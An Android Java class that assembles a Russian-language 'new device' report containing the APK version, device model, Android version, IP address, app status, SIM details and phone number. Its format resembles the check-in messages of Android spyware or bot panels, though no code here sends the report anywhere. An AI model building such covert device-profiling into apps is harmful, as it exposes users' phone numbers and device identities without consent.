package com.example.myapp;

import android.content.Context;
import android.util.Log;

public class LogGenerator {
    private static final String TAG = "LogGenerator";

    public static String generateLog(Context context, String apkVersion, String phoneNumber) {
        Log.d(TAG, "Generating log");
        StringBuilder sb = new StringBuilder();

        sb.append("📱 Новое устройство\n")
                .append("🔹 Версия APK: ").append(apkVersion).append("\n\n")
                .append("📊 Информация об устройстве:\n")
                .append(DeviceInfo.getDeviceModel()).append("\n")
                .append(DeviceInfo.getAndroidVersion()).append("\n")
                .append("IP: ").append(DeviceInfo.getIPAddress(context)).append("\n")
                .append("Статус: ").append(AppStatusChecker.isAppActive(context) ? "🟢 Активен" : "🔴 Неактивен").append("\n\n")
                .append("📶 Сим-карта:\n")
                .append(DeviceInfo.getSimInfo(context)).append("\n")
                .append("☎️ Номер: ").append(phoneNumber != null ? phoneNumber : "Неизвестен").append("\n");

        return sb.toString();
    }
}